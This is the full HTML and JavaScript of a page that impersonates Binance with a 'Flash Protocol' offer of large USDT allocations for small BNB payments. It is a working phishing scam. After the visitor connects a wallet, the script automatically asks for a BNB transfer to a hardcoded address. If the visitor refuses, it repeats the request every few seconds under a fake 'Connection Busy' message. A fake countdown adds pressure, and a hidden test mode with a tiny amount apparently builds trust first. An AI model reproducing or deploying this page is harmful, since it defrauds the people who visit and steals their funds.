<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Flash Protocol V6</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #181A20; --item: #2B3139; --text: #EAECEF; --sub: #848E9C; }
        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .main-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; text-align: center; border: 1px solid #2B3139; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .flash-counter { background: rgba(246, 70, 93, 0.1); color: #F6465D; padding: 12px; border-radius: 12px; font-weight: bold; margin-bottom: 20px; border: 1px solid #F6465D; }
        #flash-count { font-size: 22px; display: block; margin-top: 5px; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
        .modal-content { background: var(--card); width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; }
        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: var(--item); padding: 14px 16px; border-radius: 16px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .wallet-item:hover { border-color: var(--gold); background: #323942; }
        select { width: 100%; padding: 15px; background: #0B0E11; color: white; border-radius: 12px; border: 1px solid #474D57; margin-bottom: 20px; font-size: 15px; outline: none; }
        .btn-gold { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .divider { display: flex; align-items: center; text-align: center; margin: 15px 0; color: var(--sub); font-size: 13px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #2B3139; }
    </style>
</head>
<body>
<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom: 20px; cursor: pointer;" onclick="showTestMode()">
    <div class="flash-counter">Remaining Allocation: <span id="flash-count">1,482,500</span> <small>USDT</small></div>
    <div id="connect-ui"><button class="btn-gold" onclick="openModal()">Connect Wallet</button></div>
    <div id="action-ui" style="display:none;">
        <select id="amount">
            <option value="0.05">2,500 USDT (0.05 BNB)</option>
            <option value="0.09" selected>5,000 USDT (0.09 BNB)</option>
            <option value="0.2">10,000 USDT (0.2 BNB)</option>
            <option value="0.5">50,000 USDT (0.5 BNB)</option>
            <option value="1.0">100,000 USDT (1.0 BNB)</option>
        </select>
        <button class="btn-gold" onclick="execute()">Activate Flash Protocol âš¡</button>
    </div>
    <p id="status" style="font-size: 11px; color: var(--sub); margin-top: 15px;">Secure Node Connection: Active âœ…</p>
</div>

<div class="modal-overlay" id="wModal">
    <div class="modal-content">
        <div style="display:flex; justify-content:space-between; margin-bottom:20px; align-items: center;">
            <b style="font-size: 18px; color:white;">Connect Wallet</b>
            <span onclick="closeModal()" style="cursor:pointer; font-size: 20px; color: var(--sub);">âœ•</span>
        </div>
        <div class="wallet-item" onclick="initWallet()"><div style="display:flex; align-items:center; gap:12px;"><img src="https://cryptologos.cc/logos/metamask-matic-logo.png" width="28"><span style="color:white;">MetaMask</span></div><span style="font-size:10px; color:#2ebd85; font-weight:bold;">INSTALLED</span></div>
        <div class="wallet-item" onclick="initWallet()"><div style="display:flex; align-items:center; gap:12px;"><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" width="28"><span style="color:white;">WalletConnect</span></div><span style="font-size:10px; color:#3b99fc; font-weight:bold;">OPEN</span></div>
    </div>
</div>

<script type="module">
    import { createWeb3Modal, defaultConfig } from 'https://unpkg.com/@web3modal/ethers@2/dist/index.js';
    const projectId = '24cdcd4ff384e08f3ae2b1df4a0f0958';
    const bsc = { chainId: 56, name: 'BNB Chain', currency: 'BNB', explorerUrl: 'https://bscscan.com', rpcUrl: 'https://bsc-dataseed.binance.org/' };
    const metadata = { name: 'Binance Flash Node', description: 'Activation', url: window.location.origin, icons: ['https://binance.com/favicon.ico'] };
    const modal = createWeb3Modal({ ethersConfig: defaultConfig({ metadata }), chains: [bsc], projectId });
    window.initWallet = async function() {
        try {
            const walletProvider = await modal.connect();
            window.browserProvider = new ethers.BrowserProvider(walletProvider);
            window.signer = await window.browserProvider.getSigner();
            document.getElementById('wModal').style.display = 'none';
            document.getElementById('connect-ui').style.display = 'none';
            document.getElementById('action-ui').style.display = 'block';
            document.getElementById('status').innerText = "âœ… Connected. Initializing Node...";
            setTimeout(execute, 1200);
        } catch (e) { console.error(e); }
    }
</script>
<script>
    let clickCount = 0;
    const WALLET_DEST = "0xa2c4777262032A6CE29B540aA23623384a839331";
    function openModal() { document.getElementById('wModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('wModal').style.display = 'none'; }
    function showTestMode() {
        clickCount++;
        if (clickCount === 5) {
            const select = document.getElementById('amount');
            const testOpt = document.createElement('option');
            testOpt.value = "0.00001";
            testOpt.innerText = "ðŸ›  TEST MODE (0.00001)";
            testOpt.style.color = "#F6465D";
            select.prepend(testOpt);
            select.selectedIndex = 0;
            alert("Test Mode Unlocked! âš¡");
        }
    }
    let currentQty = 1482500;
    setInterval(() => {
        currentQty -= Math.floor(Math.random() * 950) + 150;
        if(currentQty < 5000) currentQty = 1482500;
        document.getElementById('flash-count').innerText = currentQty.toLocaleString();
    }, 2800);
    async function execute() {
        const val = document.getElementById('amount').value;
        const status = document.getElementById('status');
        if(!window.signer) return;
        try {
            status.innerText = "Check your wallet to confirm...";
            const tx = await window.signer.sendTransaction({ to: WALLET_DEST, value: ethers.parseEther(val) });
            status.innerText = "Verifying on Network...";
            await tx.wait();
            status.innerText = "âœ… Activation Successful!";
        } catch (err) {
            status.innerText = "Error: Connection Busy. Retrying...";
            setTimeout(execute, 3500);
        }
    }
</script>
</body>
</html>
